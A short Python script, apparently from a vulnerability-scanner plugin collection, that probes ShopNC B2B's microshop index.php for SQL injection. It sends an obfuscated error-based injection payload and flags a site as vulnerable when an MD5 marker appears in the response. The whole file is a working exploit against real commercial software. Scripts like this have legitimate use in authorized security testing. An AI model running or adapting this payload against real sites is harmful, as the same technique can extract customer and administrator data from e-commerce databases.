#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/microshop/index.php?act=personal&class_id[0]=exp&class_id[1]=1)And(Select/**/1/**/From(Select/**/Count(*),Concat((Select(Select(Select/**/Concat(0x7e,Md5(1234),0x7e)))From/**/information_schema.tables/**/limit/**/0,1),Floor(Rand(0)*2))x/**/From/**/Information_schema.tables/**/group/**/by/**/x)a)%23"
bug ="81dc9bdb52d04dc20036dbd8313ed055"
info ="存在shopNC B2B版 index.php SQL注入漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
